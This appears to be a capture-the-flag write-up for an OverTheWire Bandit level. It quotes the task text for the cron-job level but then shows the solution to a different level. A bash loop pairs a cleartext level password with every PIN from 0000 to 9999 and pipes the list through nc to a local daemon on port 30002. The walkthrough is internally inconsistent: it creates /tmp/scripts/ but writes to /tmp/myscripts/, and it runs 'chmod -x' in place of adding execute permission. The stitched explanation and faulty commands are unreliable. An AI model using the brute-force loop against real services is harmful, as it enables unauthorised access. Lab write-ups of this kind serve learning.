<p>A program is running automatically at regular intervals from
<strong>cron</strong>, the time-based job scheduler. Look in <strong>/etc/cron.d/</strong> for
the configuration and see what command is being executed.</p>

<p><strong>NOTE:</strong> This level requires you to create your own first
shell-script. This is a very big step and you should be proud of
yourself when you beat this level!</p>

<p><strong>NOTE 2:</strong> Keep in mind that your shell script is removed once
executed, so you may want to keep a copy around…</p>

Let's make a script that automatically tries all combinations.

```
bandit24@bandit:~$ mkdir /tmp/scripts/
bandit24@bandit:~$ vim /tmp/myscripts/runme.sh
  1 #!/bin/bash
  2 for i in {0000..9999}; do
  3     echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ" $i >> /tmp/myscripts/combinations.txt
  4 done
bandit24@bandit:~$ chmod -x /tmp/myscripts/runme.sh
bandit24@bandit:~$ touch /tmp/myscripts/combinations.txt
bandit24@bandit:~$ ls /tmp/myscripts/
combinations.txt  runme.sh
bandit24@bandit:~$ bash /tmp/myscripts/runme.sh
bandit24@bandit:~$ cat /tmp/myscripts/combinations.txt | nc localhost 30002
